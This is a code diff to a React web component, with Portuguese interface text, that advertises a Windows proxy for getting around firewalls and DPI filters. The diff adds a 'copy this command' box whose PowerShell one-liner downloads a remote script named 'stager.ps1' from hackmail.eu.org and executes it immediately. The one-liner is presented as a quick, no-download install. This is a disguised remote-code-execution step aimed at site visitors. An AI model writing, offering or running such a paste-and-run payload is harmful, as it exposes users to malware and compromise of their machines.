@@ -56,13 +56,32 @@ const TokenGeneratorCard = () => {
     <div className="glass-panel p-6 rounded-2xl flex flex-col items-start gap-4">
       <div className="flex items-center gap-2 mb-2 text-foreground font-medium">
         <Key className="h-5 w-5 text-primary" />
-        Proxy de Sistema Inteiro (.exe)
+        Proxy de Sistema Inteiro (.exe / PowerShell)
       </div>
       
       <p className="text-sm text-muted-foreground w-full">
         Drible restrições de rede, firewalls rígidos e filtros DPI com nosso proxy para Windows. 
         Esse sistema encapsula todo o tráfego do sistema operacional via Cloudflare. O token gerado dura 2H e fica atrelado ao registro global (RG) da sua máquina.
       </p>
+
+      <div className="w-full bg-[#1e1e1e] border border-border p-4 rounded-xl flex flex-col gap-2 mt-2">
+        <span className="text-xs text-muted-foreground font-semibold">Comando PowerShell (Mais Rápido & Sem Baixar Nada):</span>
+        <div className="flex items-center justify-between gap-2">
+          <code className="text-[10px] sm:text-xs text-emerald-400 break-all select-all font-mono">
+            Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")
+          </code>
+          <Button 
+            variant="ghost" 
+            size="sm" 
+            className="shrink-0 h-7 text-xs"
+            onClick={() => {
+              navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")');
+              toast({ title: "Comando Copiado!", duration: 2000 });
+            }}>
+            Copiar
+          </Button>
+        </div>
+      </div>
 
       {token && (
         <div className="w-full bg-secondary border border-border p-4 rounded-xl flex items-center justify-between">
